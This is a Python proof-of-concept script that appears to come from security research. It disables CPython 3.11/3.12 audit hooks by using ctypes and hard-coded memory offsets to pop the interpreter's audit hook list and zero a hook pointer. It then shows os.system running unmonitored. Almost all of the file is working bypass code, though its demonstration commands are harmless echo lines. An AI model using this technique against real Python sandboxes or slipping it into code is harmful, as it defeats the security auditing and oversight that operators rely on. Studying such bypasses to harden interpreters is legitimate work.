#!audit_hook_head_finder

### POC2.py
### only use offset to pop the audit hook

import sys
# ONLY TESTED ON PYTHON 3.12 and 3.11
# the offsets are from POC.py
if sys.version_info[:2] == (3, 12):
    if sys.version_info[2] <= 3:
        PTR_OFFSET = [0x41448, -0x11df0] # <= 3.12.3
    else:
        PTR_OFFSET = [0x41448, -0x11e20] # for python3.12.4
else:
    PTR_OFFSET = [0xe00, -0xe388]

import ctypes
from audit_hook_head_finder import add_audit

sys.addaudithook((lambda x: lambda *args: x("audit hook triggered!", args))(print))
add_audit()

print("--- finished setup ---")

addr = ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value

ctypes._os.system("echo 'test audit hook -- this will trigger hook'")

ctypes.cast(
    ctypes.cast(
        addr + PTR_OFFSET[0] , ctypes.POINTER(ctypes.c_uint64)
    ).contents.value
    , ctypes.py_object
).value.pop()

ctypes.memset(
    ctypes.cast(
        addr + PTR_OFFSET[1] , ctypes.POINTER(ctypes.c_uint64)
    ), 0, 8
)

ctypes._os.system("echo 'test audit hook -- this will not'")